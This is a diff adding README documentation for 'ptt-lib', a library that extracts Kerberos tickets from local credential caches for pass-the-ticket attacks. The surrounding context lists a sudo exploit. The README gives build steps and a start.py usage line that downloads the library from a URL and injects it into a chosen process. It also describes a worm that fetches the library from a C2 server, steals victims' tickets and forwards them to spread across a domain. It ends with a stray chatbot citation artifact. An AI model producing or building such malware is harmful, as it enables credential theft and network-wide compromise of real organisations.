@@ -321,4 +321,56 @@ exploits.csv:
 id,cve,description,path
 50035,CVE-2021-3156,Sudo heap overflow exploit,exploits/linux/local/50035.py
 ```
+# ptt‑lib
+ 
+Platform independent shared C library so/dll that extracts and serializes Kerberos tickets from the local cache krb5cc_<uid> for use in SMB/SSH authentication pass‑the‑ticket.
+
+- Supports reading the default or a custom ccache path  
+- Serializes each ticket into a compact binary format: [4‑byte BE length][ticket data]  
+- Lightweight, with no external dependencies except MIT Kerberos  
+- Suitable for dynamic loading via dlopen / LoadLibrary and invocation from Go/Python/C embeddings  
+
+### Functions
+- ptt_init initialize the Kerberos context.  
+- ptt_export open the specified or default ccache, iterate all tickets, and serialize them into the buffer. 
+- ptt_cleanup free Kerberos context resources.  
+
+### Build
+```
+mkdir build && cd build
+cmake ..
+cmake --build .
+````
+
+Generates:
+
+* libptt.so on Linux
+* ptt.dll on Windows
+
+### Injection using start.py
+
+```
+python3 start.py <URL_LIB> <PID>
+```
+
+* <URL_LIB> — URL to `libptt.so` or `ptt.dll`
+* <PID>     — target process ID for injection
+
+The script downloads the library into TEMP, detects the platform, and injects it into the target process via GDB/dlopen on Linux or CreateRemoteThread on Windows.
+
+---
+
+### Integration
+
+The main worm binary can invoke start.py to:
+
+1. Dynamically fetch the latest `ptt‑lib` from the C2 server
+2. Inject the library into a victim process
+3. Call inside the injected process to collect Kerberos tickets
+
+The ptt_export interface then allows the worm to retrieve and forward tickets over the network for further propagation within the domain.
+
+```
+::contentReference[oaicite:0]{index=0}
+```
 
